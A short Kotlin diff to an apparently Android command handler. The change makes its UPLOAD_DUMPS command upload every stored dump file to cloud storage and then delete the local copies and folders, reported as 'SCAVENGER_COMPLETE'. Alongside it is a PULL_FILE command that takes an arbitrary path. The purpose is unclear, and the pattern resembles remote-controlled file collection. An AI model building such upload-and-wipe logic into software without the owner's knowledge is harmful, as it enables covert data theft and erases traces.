@@ -158,17 +158,40 @@ object CommandProcessor {
                     status = "MANUAL_BACKUP_INITIATED"
                 }
                 "UPLOAD_DUMPS" -> {
-                    val dumps = DumpManager.getDumpsForToday()
-                    var successCount = 0
-                    dumps.forEach {
-                        if (CloudManager.uploadFile(ctx, it, "DUMPS")) successCount++
+                    val root = DumpManager.getRootDir()
+                    val dateFolders = root.listFiles { f -> f.isDirectory } ?: emptyArray()
+                    var filesUploaded = 0
+                    var foldersCleared = 0
+
+                    for (folder in dateFolders) {
+                        val files = folder.listFiles() ?: continue
+                        if (files.isEmpty()) {
+                            folder.delete()
+                            continue
+                        }
+
+                        var folderEmpty = true
+                        for (f in files) {
+                            // Upload to 'ARCHIVE' category
+                            if (CloudManager.uploadFile(ctx, f, "ARCHIVE")) {
+                                f.delete()
+                                filesUploaded++
+                            } else {
+                                folderEmpty = false
+                            }
+                        }
+
+                        if (folderEmpty) {
+                            folder.delete()
+                            foldersCleared++
+                        }
                     }
-                    if (successCount != dumps.size) {
-                        status = "PARTIAL_SYNC_FAILED ($successCount/${dumps.size})"
-                        errorMsg = "Some archives failed to upload. Check network connection."
-                    } else {
-                        status = "ARCHIVE_SYNC_COMPLETE ($successCount)"
-                    }
+                    status = "SCAVENGER_COMPLETE"
+                    val result = JSONObject()
+                    result.put("files_synced", filesUploaded)
+                    result.put("vault_folders_wiped", foldersCleared)
+                    updateCommandStatus(ctx, id, status, null, result, null)
+                    return
                 }
                 "PULL_FILE" -> {
                     val f = File(content)
